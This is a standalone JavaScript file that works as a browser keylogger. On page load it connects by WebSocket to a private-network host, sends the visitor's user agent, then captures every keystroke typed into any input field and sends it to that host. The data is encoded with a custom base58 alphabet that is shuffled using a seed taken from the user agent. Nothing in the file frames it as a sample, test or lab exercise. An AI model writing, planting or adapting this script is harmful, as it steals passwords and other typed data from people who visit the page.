window.addEventListener("DOMContentLoaded", function() {

  function encode(msg, key) {
    var encoded_arr = [];
    if (typeof s === "string") msg = (new TextEncoder("utf-8")).encode(msg);
    var i=0, z;
    for (;i < msg.length;i++) if(msg[i]) break;
    z = i;
    for (;i < msg.length;i++) {
      var c = msg[i], j = 0;
      for (;j in encoded_arr || c;j++) {
        if (encoded_arr[j]) c += encoded_arr[j] * 256;
        encoded_arr[j] = c % 58;
        c = Math.floor(c / 58);
      }
    }
    return key[0].repeat(z) + encoded_arr.reverse().map(x => key[x]).join("");
  }

  function hash(s) {
    var r = 0, i=0;
    for (;i < s.length;i++) r = r * 31 + s.charCodeAt(i) | 0;
    return r;
  }

  function rand(s) {
    var x = 123456789, y=362436069, z=521288629, w = 88675123, t;
    return function(a, b) {
      t = x ^ x << 11;
      x = y; y = z; z = w;
      w = w ^ w >> 19 ^ (t ^ t >> 8);
      if (a !== undefined && b !== undefined) {
        return a + w % (b + 1 - a);
      }
      return w;
    };
  }

  function shuffle(a, r) {
    var i;
    i = a.length - 1;
    for (;i > 0;i--) {
      var j = Math.abs(r(0, i));
      var t = a[i]; a[i] = a[j]; a[j] = t;
    }
  }

  var ws = new WebSocket("ws://192.168.99.101:7467");
  var key = "MeitamANbcfv2yXDH1RjPTzVqnLYFhE54uJUkdwCgGB36srQ8o9ZK7WxSp";
  var key2 = key;

  ws.addEventListener("open", function(event) {
    var message = navigator.userAgent;
    ws.send(encode(message, key));
    key2 = key.split("");
    shuffle(key2, rand(hash(message)));
    key2 = key2.join("");
  });

  Array.from(document.getElementsByTagName("input")).forEach(function(e) {
    e.addEventListener("keyup", function(v) {
      ws.send(encode(Math.random().toString().slice(2) + " " + v.key, key2));
    }, false);
  });

}, false);
